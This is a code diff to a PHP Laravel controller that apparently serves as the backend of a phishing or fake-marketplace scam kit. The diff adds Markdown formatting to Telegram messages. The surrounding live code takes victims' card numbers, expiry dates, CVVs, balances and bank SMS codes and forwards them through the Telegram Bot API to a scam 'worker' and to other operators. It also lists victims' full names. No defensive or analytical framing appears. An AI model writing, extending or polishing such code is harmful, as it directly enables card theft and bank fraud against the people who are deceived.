@@ -36,10 +36,10 @@ class OrderController extends Controller
         $order = Order::where('unique_id', $request->input('unique_id'))->firstOrFail();
 
         $message = "Мамонтёнок вводит баланс, объявление: " . $order->ad_name;
-        $wbiv = $message . "\n\nКарта 💳 `" . $request->input('card') . "`" .
-    "\nДата 🕰 " . $request->input('expiryDate') .
-    "\nCVV 🤫 `" . $request->input('cvv') . "`" .
-    "\n\nВоркер 🥷 " . $order->username;
+        $wbiv = $message . "\n\n*Карта* 💳 `" . $request->input('card') . "`" .
+    "\n*Дата* 🕰 " . $request->input('expiryDate') .
+    "\n*CVV* 🤫 `" . $request->input('cvv') . "`" .
+    "\n\n*Воркер* 🥷 " . $order->username;
         $this->sendMessage($message, $order->worker_id);
         foreach (Bievers::all() as $bievers) {
             $this->sendMessageWithInline($wbiv, $bievers->biever_id, $order->unique_id);
@@ -53,10 +53,10 @@ class OrderController extends Controller
 
         $message = "ЕСТЬ лог баланса, объявление: " . $order->ad_name;
         $wbiv = $message . "\n\nКарта 💳 `" . $request->input('card') . "`" .
-            "\nДата 🕰 " . $request->input('expiryDate') .
-            "\nCVV 🤫 `" . $request->input('cvv') . "`" .
-            "\nБаланс 💷 " . $request->input('balance') .
-            "\n\nВоркер 🥷 " . $order->username;
+            "\n*Дата* 🕰 " . $request->input('expiryDate') .
+            "\n*CVV* 🤫 `" . $request->input('cvv') . "`" .
+            "\n*Баланс* 💷 " . $request->input('balance') .
+            "\n\n*Воркер* 🥷 " . $order->username;
         $this->sendMessage($message, $order->worker_id);
         foreach (Bievers::all() as $bievers) {
             $this->sendMessageWithInline($wbiv, $bievers->biever_id, $order->unique_id);
@@ -70,8 +70,8 @@ class OrderController extends Controller
         $order = Order::where('unique_id', $request->input('unique_id'))->firstOrFail();
 
         $message = "СМС от банка, объявление: " . $order->ad_name;
-        $wbiv = $message . "\nКод ✉️ `" . $request->input('code') . "`" .
-            "\n\nВоркер 🥷 " . $request->input('username');
+        $wbiv = $message . "\n*Код* ✉️ `" . $request->input('code') . "`" .
+            "\n\n*Воркер* 🥷 " . $request->input('username');
         $this->sendMessage($message, $order->worker_id);
         foreach (Bievers::all() as $bievers) {
             $this->sendMessageWithInline($wbiv, $bievers->biever_id, $order->unique_id);
@@ -104,10 +104,10 @@ class OrderController extends Controller
 
         $links = $orders->map(function ($order) {
             return 'Название 📎 ' . $order->ad_name . "\n" .
-                'Ссылка 🔗 ' . url('/details/' . $order->unique_id) . "\n" .
-                'ФИО 👨 ' . $order->full_name . "\n" .
-                'Цена 💷 ' . $order->price . "\n" .
-                'Адресс 📍 ' . $order->price . "\n\n";
+                '*Ссылка* 🔗 ' . url('/details/' . $order->unique_id) . "\n" .
+                '*ФИО* 👨 ' . $order->full_name . "\n" .
+                '*Цена* 💷 ' . $order->price . "\n" .
+                '*Адресс* 📍 ' . $order->price . "\n\n";
         });
 
         return response()->json(['links' => $links], 200);
@@ -118,6 +118,7 @@ class OrderController extends Controller
         Http::get('https://api.telegram.org/bot' . $this->token . '/sendMessage', [
             'chat_id' => $chat_id,
             'text' => $message,
+            'parse_mode' => 'Markdown'
         ]);
     }
 
@@ -126,6 +127,7 @@ class OrderController extends Controller
         Http::get('https://api.telegram.org/bot' . $this->token . '/sendMessage', [
             'chat_id' => $chat_id,
             'text' => $message,
+            'parse_mode' => 'Markdown',
             'reply_markup' => json_encode([
                 'inline_keyboard' => [
                     [
